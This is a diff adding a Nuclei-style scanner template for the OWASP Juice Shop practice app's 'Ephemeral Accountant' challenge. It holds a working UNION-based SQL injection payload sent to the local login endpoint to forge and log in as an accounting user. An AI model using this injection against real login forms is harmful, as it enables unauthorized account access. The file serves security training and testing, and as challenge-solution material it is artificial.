@@ -1,0 +1,33 @@
+id: Ephermeral-Accountant
+
+info:
+  name: Ephermeral-Accountant in Juice Shop
+  author: your_name
+  severity: high
+  description: Attempting Injection in login.
+
+variables: 
+    sql-injection: "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--"
+  
+
+requests:
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: 127.0.0.1:3000
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"email":"{{sql-injection}}","password":"trycyber"}
+
+    matchers:
+          - type: status
+            status:
+              - 200
+
+          - type: word
+            words:
+              - "acc0unt4nt@juice-sh.op"
+            part: body
+
